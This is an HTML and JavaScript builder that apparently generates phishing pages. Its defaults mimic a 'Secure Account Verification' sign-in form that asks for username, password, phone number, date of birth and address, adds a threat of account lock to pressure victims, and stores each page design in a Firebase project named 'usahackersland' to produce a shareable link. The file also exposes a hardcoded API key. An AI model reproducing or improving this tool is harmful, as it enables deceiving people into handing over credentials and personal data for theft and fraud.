<!doctype html>
<html>
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>üé® COMPLETE FINAL</title>
<style>
body{font-family:Arial,Helvetica,sans-serif;background:#f4f6f8;padding:18px}
.wrap{max-width:1200px;margin:auto;background:#fff;padding:18px;border-radius:10px}
label{display:block;margin-top:10px;font-weight:700}
input,textarea,select,button{width:100%;padding:8px;margin-top:6px;border-radius:6px;border:1px solid #ccc;box-sizing:border-box}
textarea{min-height:70px}
.row{display:flex;gap:10px}
.col{flex:1}
.btn{background:#1976d2;color:#fff;border:none;padding:10px;border-radius:6px;cursor:pointer}
.btn.alt{background:#6c757d}
.previewWrap{border:1px solid #ddd;border-radius:8px;padding:8px;margin-top:10px;background:#fff}
#preview{position:relative;min-height:520px;height:75vh;overflow:auto}
.draggableBtn{position:absolute;cursor:move;color:#fff;border:none;border-radius:8px}
.linkBox{margin-top:12px;padding:10px;background:#f1f8ff;border-radius:6px;word-break:break-all}
.embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px}
</style>

<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
</head>
<body>
<div class="wrap">
<h2>üé® COMPLETE</h2>

<div style="display:flex;gap:18px;flex-wrap:wrap">

<!-- LEFT PANEL -->
<div style="flex:1;min-width:340px">

<label>SEO Page Title</label>
<input id="seoTitle" value="Secure Account Verification">

<label>Meta Description</label>
<textarea id="metaDesc">Verify your account to continue securely</textarea>

<label>OG Image URL</label>
<input id="ogImage" value="https://example.com/og-image.png">

<label>Avatar Image URL</label>
<input id="avatarURL" value="https://i.pravatar.cc/150">

<label>Logo Image URL</label>
<input id="logoURL" value="https://upload.wikimedia.org/wikipedia/commons/a/ab/Logo_TV_2015.png">

<label>Banner Image URL</label>
<input id="bannerURL" value="https://picsum.photos/800/300">

<label>Page Title</label>
<input id="title" value="Welcome Back">

<label>Title Color</label>
<input type="color" id="titleColor" value="#111111">

<label>Subtitle</label>
<input id="subtitle" value="Please sign in to continue">

<label>Subtitle Color</label>
<input type="color" id="subtitleColor" value="#555555">

<label>Description Text</label>
<textarea id="description">This verification helps keep your account safe.</textarea>

<label>Gallery Images (comma separated)</label>
<textarea id="galleryImages">https://picsum.photos/300/200, https://picsum.photos/301/200</textarea>

<label>Videos (comma separated)</label>
<textarea id="videoLinks">https://www.youtube.com/watch?v=dQw4w9WgXcQ</textarea>

<label>Background Image URL</label>
<input id="bgImageURL" value="https://picsum.photos/1200/800">

<label>Background Size</label>
<input id="bgSize" value="cover">

<label><input type="checkbox" id="enableWarning" checked> Show Warning</label>
<textarea id="warning">‚ö†Ô∏è Failure to verify may result in account lock!</textarea>

<label><input type="checkbox" id="enableWarningPosition" checked> Customize Warning Position</label>
<select id="warningPosition">
<option value="normal">Normal</option>
<option value="left">Left</option>
<option value="center">Center</option>
<option value="right">Right</option>
<option value="none">None</option>
</select>

<label><input type="checkbox" id="addAuth" checked> Include Username & Password</label>
<input id="usernamePlaceholder" value="Email or Username">
<input id="passwordPlaceholder" value="Password">

<label>Extra Fields (one per line)</label>
<textarea id="extraFields">
Phone Number
Date of Birth
Address
</textarea>

<label>Text Color</label>
<input type="color" id="textColor" value="#222222">

<label>Background Color</label>
<input type="color" id="bgColor" value="#ffffff">

<label>Main Button Text</label>
<input id="buttonText" value="Continue Verification">
<label><input type="checkbox" id="showMainBtn" checked> Show Main Button</label>

<label>Button Color</label>
<input type="color" id="btnColor" value="#1976d2">

<label>Button Position</label>
<select id="btnPosition">
<option value="center">Center</option>
<option value="left">Left</option>
<option value="right">Right</option>
</select>

<h3>Extra Smart Drag Buttons</h3>
<label>New Button Text</label>
<input id="newBtnText" value="WhatsApp Support">
<label>New Button Link</label>
<input id="newBtnLink" value="https://wa.me/123456789">
<label>New Button Color</label>
<input type="color" id="newBtnColor" value="#25D366">
<label>New Button Size (px)</label>
<input id="newBtnSize" value="44">
<label><input type="checkbox" id="newBtnShow" checked> Show this button</label>

<div class="row">
<button class="btn" onclick="addExtraButton()">Add Button</button>
<button class="btn alt" onclick="clearExtraButtons()">Clear Buttons</button>
</div>

<h3>Embed Links (Above Main Button)</h3>
<label>Embed Link Text</label>
<input id="embedText" placeholder="Custom Text">
<label>Embed Link URL</label>
<input id="embedURL" placeholder="https://example.com">
<label>Embed Description (Optional)</label>
<input id="embedDesc" placeholder="Short description">
<label><input type="checkbox" id="embedShow" checked> Show this embed link</label>

<div class="row">
<button class="btn" onclick="addEmbedLink()">Add Embed Link</button>
<button class="btn alt" onclick="clearEmbedLinks()">Clear Embed Links</button>
</div>

<h3>Redirect Settings</h3>
<label><input type="checkbox" id="enableRedirect"> Redirect after submission</label>
<input id="redirectURL" placeholder="https://example.com">

<h3>Generate Button Settings</h3>
<label>Generate Button Text</label>
<input id="generateBtnText" value="Generate" placeholder="Button Text">
<label><input type="checkbox" id="showGenerateBtn" checked> Show this button in form</label>

<label>Footer Text</label>
<input id="footerText" value="¬© 2025 Secure Verification Portal">

<div class="row">
<button class="btn" onclick="generateForm()">Generate</button>
</div>

<div id="linkArea" class="linkBox" style="display:none"></div>
</div>

<!-- PREVIEW -->
<div style="flex:0 0 540px">
<label>Live Preview</label>
<div class="previewWrap"><div id="preview"></div></div>
</div>

</div>
</div>

<script>
const $ = id => document.getElementById(id);
let extraButtons = [], embedLinks = [], dragging = null, dx = 0, dy = 0;

const firebaseConfig = {
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

document.querySelectorAll("input,textarea,select").forEach(e=>{
  e.addEventListener("input",renderPreview);
  e.addEventListener("change",renderPreview);
});

function addExtraButton(){
  if(!$("newBtnShow").checked) return;
  extraButtons.push({
    id:"b"+Math.random().toString(36).slice(2),
    text:$("newBtnText").value,
    link:$("newBtnLink").value,
    color:$("newBtnColor").value,
    size:parseInt($("newBtnSize").value)||44,
    x:40,y:60,
    show:$("newBtnShow").checked
  });
  renderPreview();
}

function clearExtraButtons(){extraButtons=[];renderPreview();}
function addEmbedLink(){
  if(!$("embedShow").checked) return;
  embedLinks.push({
    text:$("embedText").value,
    url:$("embedURL").value,
    desc:$("embedDesc").value,
    show:$("embedShow").checked
  });
  renderPreview();
}
function clearEmbedLinks(){embedLinks=[];renderPreview();}

function renderPreview(){
  const p=$("preview");
  p.innerHTML="";
  p.style.background=$("bgColor").value;
  if($("bgImageURL").value){
    p.style.backgroundImage=`url(${$("bgImageURL").value})`;
    p.style.backgroundSize=$("bgSize").value;
  }

  const c=document.createElement("div");
  c.style.padding="16px";
  c.style.color=$("textColor").value;

  if($("avatarURL").value)c.innerHTML+=`<img src="${$("avatarURL").value}" style="width:90px;border-radius:50%;display:block;margin:auto">`;
  if($("logoURL").value)c.innerHTML+=`<img src="${$("logoURL").value}" style="width:140px;display:block;margin:auto">`;

  c.innerHTML+=`<h2 style="text-align:center;color:${$("titleColor").value}">${$("title").value}</h2>`;
  c.innerHTML+=`<p style="text-align:center;color:${$("subtitleColor").value}">${$("subtitle").value}</p>`;
  c.innerHTML+=`<p>${$("description").value}</p>`;

  if($("enableWarning").checked && $("warningPosition").value!=="none"){
    c.innerHTML+=`<p style="color:#b71c1c;text-align:${$("warningPosition").value}">${$("warning").value}</p>`;
  }

  const f=document.createElement("div");
  f.style.display="flex";
  f.style.flexDirection="column";
  f.style.alignItems=$("btnPosition").value==="left"?"flex-start":$("btnPosition").value==="right"?"flex-end":"center";
  f.style.gap="8px";

  if($("addAuth").checked){
    f.innerHTML+=`<input placeholder="${$("usernamePlaceholder").value}">`;
    f.innerHTML+=`<input type="password" placeholder="${$("passwordPlaceholder").value}">`;
  }

  $("extraFields").value.split("\n").forEach(v=>{
    if(v.trim()) f.innerHTML+=`<input placeholder="${v.trim()}">`;
  });

  // Embed Links
  embedLinks.forEach(link=>{
    if(!link.show) return;
    const div=document.createElement("div");
    div.className="embedLink";
    div.innerHTML=`<strong>${link.text}</strong>: <a href="${link.url}" target="_blank">${link.url}</a>`;
    if(link.desc) div.innerHTML+=`<br><small>${link.desc}</small>`;
    f.appendChild(div);
  });

  // Generate Button
  if($("showGenerateBtn").checked){
    const genBtn = document.createElement("button");
    genBtn.className="mainBtn";
    genBtn.style.background="#1976d2";
    genBtn.textContent = $("generateBtnText").value; // custom text
    genBtn.onclick = ()=>alert("Form Generated!");
    f.appendChild(genBtn);
  }

  // Main Button
  if($("showMainBtn").checked){
    const mainBtn = document.createElement("button");
    mainBtn.style.background=$("btnColor").value;
    mainBtn.style.color="#fff";
    mainBtn.style.padding="10px";
    mainBtn.style.border="none";
    mainBtn.style.borderRadius="8px";
    mainBtn.textContent=$("buttonText").value;
    mainBtn.onclick=()=>alert("Form submitted!");
    f.appendChild(mainBtn);
  }

  c.appendChild(f);

  // Extra draggable buttons
  extraButtons.forEach(b=>{
    if(!b.show) return;
    const btn=document.createElement("button");
    btn.className="draggableBtn";
    btn.textContent=b.text;
    btn.style.background=b.color;
    btn.style.width=b.size+"px";
    btn.style.height=b.size+"px";
    btn.style.left=b.x+"%";
    btn.style.top=b.y+"%";
    btn.onmousedown=e=>{dragging=b;dx=e.offsetX;dy=e.offsetY;};
    btn.onclick=()=>window.open(b.link,"_blank");
    p.appendChild(btn);
  });

  c.innerHTML+=`<footer style="text-align:center;margin-top:10px;font-size:12px">${$("footerText").value}</footer>`;
  p.appendChild(c);

  document.onmousemove=e=>{
    if(!dragging)return;
    const r=p.getBoundingClientRect();
    dragging.x=((e.clientX-r.left-dx)/r.width)*100;
    dragging.y=((e.clientY-r.top-dy)/r.height)*100;
    renderPreview();
  };
  document.onmouseup=()=>dragging=null;
}

function generateForm(){
  const formData = {
    seoTitle: $("seoTitle").value,
    metaDesc: $("metaDesc").value,
    ogImage: $("ogImage").value,
    avatarURL: $("avatarURL").value,
    logoURL: $("logoURL").value,
    bannerURL: $("bannerURL").value,
    title: $("title").value,
    titleColor: $("titleColor").value,
    subtitle: $("subtitle").value,
    subtitleColor: $("subtitleColor").value,
    description: $("description").value,
    galleryImages: $("galleryImages").value.split(",").map(i=>i.trim()),
    videoLinks: $("videoLinks").value.split(",").map(i=>i.trim()),
    bgImageURL: $("bgImageURL").value,
    bgSize: $("bgSize").value,
    enableWarning: $("enableWarning").checked,
    warning: $("warning").value,
    warningPosition: $("warningPosition").value,
    addAuth: $("addAuth").checked,
    usernamePlaceholder: $("usernamePlaceholder").value,
    passwordPlaceholder: $("passwordPlaceholder").value,
    extraFields: $("extraFields").value.split("\n").map(i=>i.trim()),
    textColor: $("textColor").value,
    bgColor: $("bgColor").value,
    btnColor: $("btnColor").value,
    buttonText: $("buttonText").value,
    showMainBtn: $("showMainBtn").checked,
    showGenerateBtn: $("showGenerateBtn").checked,
    generateBtnText: $("generateBtnText").value,
    btnPosition: $("btnPosition").value,
    extraButtons: extraButtons,
    embedLinks: embedLinks,
    enableRedirect: $("enableRedirect").checked,
    redirectURL: $("redirectURL").value,
    footerText: $("footerText").value,
    createdAt: new Date().toISOString()
  };

  db.collection("forms").add(formData)
    .then(docRef => {
      const link = `${window.location.origin}/form.html?id=${docRef.id}`;
      $("linkArea").style.display="block";
      $("linkArea").innerHTML = `‚úÖ Form saved successfully! <br>Link: <a href="${link}" target="_blank">${link}</a>`;
    })
    .catch(error => {
      console.error("Error adding document: ", error);
      $("linkArea").style.display="block";
      $("linkArea").textContent = "‚ùå Error saving form.";
    });
}

renderPreview();
</script>
</body>
</html>
